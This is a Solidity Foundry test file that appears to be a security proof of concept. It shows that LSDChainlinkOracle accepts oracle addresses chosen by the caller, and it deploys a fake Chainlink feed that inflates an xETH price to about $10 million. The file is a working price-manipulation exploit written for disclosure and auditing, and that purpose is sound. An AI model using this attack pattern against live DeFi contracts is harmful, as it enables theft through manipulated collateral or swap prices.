// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {LSDChainlinkOracle} from "src/LSDChainlinkOracle.sol";
// Use a direct path from the lib folder, which always works.
import {AggregatorV3Interface} from "lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";/*
 * =============================================================================
 * ==         PROOF OF CONCEPT for LSDChainlinkOracle Vulnerability         ==
 * =============================================================================
 */

// This is the attacker's malicious oracle. It implements the standard Chainlink interface.
contract FakeChainlinkOracle is AggregatorV3Interface {
    int256 public maliciousPrice;
    uint8 public maliciousDecimals;

    constructor(int256 _price, uint8 _decimals) {
        maliciousPrice = _price;
        maliciousDecimals = _decimals;
    }

    function latestRoundData()
    external
    view
    override
    returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    )
    {
        return (1, maliciousPrice, block.timestamp, block.timestamp, 1);
    }

    function decimals() external view override returns (uint8) {
        return maliciousDecimals;
    }

    // --- Unused functions from the interface ---
    function description() external pure override returns (string memory) { return "Fake Oracle"; }
    function version() external pure override returns (uint256) { return 1; }
    function getRoundData(uint80) external view override returns (uint80, int256, uint256, uint256, uint80) {
        return (1, maliciousPrice, block.timestamp, block.timestamp, 1);
    }
}


contract LSDOracle_PoC is Test {
    LSDChainlinkOracle internal lsdOracle;

    function setUp() public {
        lsdOracle = new LSDChainlinkOracle();
    }

    /*
     * @notice This test demonstrates the CRITICAL vulnerability.
     * An attacker can supply the addresses of their own malicious oracle contracts
     * through the `data` parameter, allowing them to return any arbitrary price.
     */
    function test_CRITICAL_PriceCanBeManipulatedWithFakeOracles() public {
        console.log("\n--- PoC: Price Manipulation via User-Supplied Oracles ---");

        // --- Setup ---
        // Attacker deploys two fake oracles with malicious prices.

        // Fake Oracle 1 returns a malicious ETH/USD price of $1,000,000.
        // The real Chainlink ETH/USD feed has 8 decimals.
        int256 fakeEthPrice = 1_000_000 * 1e8; // $1 Million
        FakeChainlinkOracle fakeEthOracle = new FakeChainlinkOracle(fakeEthPrice, 8);

        // Fake Oracle 2 returns a malicious xETH/ETH price of 10.
        // A real xETH/ETH price should be very close to 1.
        // This feed typically has 18 decimals.
        int256 fakeXEthPrice = 10 * 1e18; // 10 ETH
        FakeChainlinkOracle fakeXEthOracle = new FakeChainlinkOracle(fakeXEthPrice, 18);

        console.log("  Step 1: Attacker deploys two fake oracles.");
        console.log("     - Fake ETH/USD Oracle returns: $1,000,000");
        console.log("     - Fake xETH/ETH Oracle returns: 10 ETH");

        // --- Action ---
        bytes memory maliciousData = abi.encode(
            address(fakeEthOracle),
                                                0,
                                                address(fakeXEthOracle),
                                                0
        );
        console.log("  Step 2: Attacker calls `getPrice` with the malicious data blob.");
        uint256 manipulatedPrice = lsdOracle.getPrice(0, 0, maliciousData);

        // --- Verification ---
        // Let's assume the black-box `LibChainlinkOracle` correctly normalizes prices to 6 decimals
        // for the `decimals=0` case before passing them to `LSDChainlinkOracle`.
        // xETH/ETH price (10e18) normalized to 6 decimals: 10 * 1e6
        uint256 normalizedXEthPrice = 10 * 1e6;
        // ETH/USD price (1,000,000e8) normalized to 6 decimals: 1,000,000 * 1e6
        uint256 normalizedEthPrice = 1_000_000 * 1e6;

        // The final calculation in `getPrice` is `(xEthEthPrice * ethUsdPrice) / 1e6`
        uint256 expectedManipulatedPrice = (normalizedXEthPrice * normalizedEthPrice) / 1e6; // = 10,000,000e6

        console.log("  Result: The oracle returned a price of $%d", manipulatedPrice / 1e6);
        console.log("  A real xETH token should be worth thousands of dollars. We made it worth $10 million.");

        assertEq(manipulatedPrice, expectedManipulatedPrice, "The price was not manipulated as expected.");
        console.log("\nSUCCESS: The oracle's price was successfully manipulated to an arbitrary, massive value.");
    }
}
